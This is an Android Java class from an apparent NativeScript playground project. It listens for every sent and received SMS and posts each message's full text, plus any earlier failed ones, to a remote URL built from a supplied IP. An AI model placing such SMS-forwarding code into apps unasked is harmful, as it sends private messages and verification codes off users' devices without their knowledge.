package com.roblav96.nativescriptplayground;

import android.content.Context;
import android.util.Log;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.tuenti.smsradar.Sms;
import com.tuenti.smsradar.SmsListener;
import com.tuenti.smsradar.SmsRadar;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by roblav96 on 10/25/16.
 */



public class MySmsRader {
    private static final String TAG = "roblav96";



    private Context _context;
    private String _url;
    private RequestQueue _queue;
    private ArrayList<String> _failed;

    public MySmsRader(
            Context context,
            String IP
    ) {
        _context = context;
        _url = IP + "/api/android-sms";
        _queue = Volley.newRequestQueue(_context);
        _failed = new ArrayList<>();

        SmsRadar.initializeSmsRadarService(context, new SmsListener() {
            @Override
            public void onSmsSent(Sms sms) {
                Log.e(TAG, "onSmsSent > sms > " + sms);
                sendSms(sms.toString());
            }
            @Override
            public void onSmsReceived(Sms sms) {
                Log.e(TAG, "onSmsReceived > sms > " + sms);
                sendSms(sms.toString());
            }
        });
    }

    public void stopService() {
        SmsRadar.stopSmsRadarService(_context);
    }

    private void sendSms(final String sms) {
        StringRequest request = new StringRequest(
            Request.Method.POST,
            _url,
            new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    Log.e(TAG, "onResponse > response > " + response);
                    _failed.clear();
                }
            },
            new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.e(TAG, "onErrorResponse > error > " + error.getMessage());
                    _failed.add(sms);
                }
            }
        ){
            @Override
            protected Map<String,String> getParams() {
                Map<String, String> params = new HashMap<>();
                params.put("item0", sms);
                for (int i = 0; i < _failed.size(); i++) {
                    params.put("item" + (i + 1), _failed.get(i));
                }
                return params;
            }
        };
        _queue.add(request);
    }

}


































//
